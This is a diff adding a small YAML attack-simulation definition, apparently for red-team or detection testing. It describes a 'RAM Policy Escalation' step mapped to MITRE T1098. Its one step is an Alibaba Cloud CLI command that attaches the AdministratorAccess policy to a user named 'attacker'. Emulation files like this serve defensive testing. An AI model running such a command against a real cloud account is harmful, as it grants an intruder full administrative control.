@@ -1,0 +1,7 @@
+name: RAM Policy Escalation
+description: RAM Policy Escalation
+mitre_technique: T1098
+stage: Privilege Escalation
+steps:
+- action: aliyun ram AttachPolicyToUser --PolicyName AdministratorAccess --UserName attacker
+  description: Attach high-privilege policy
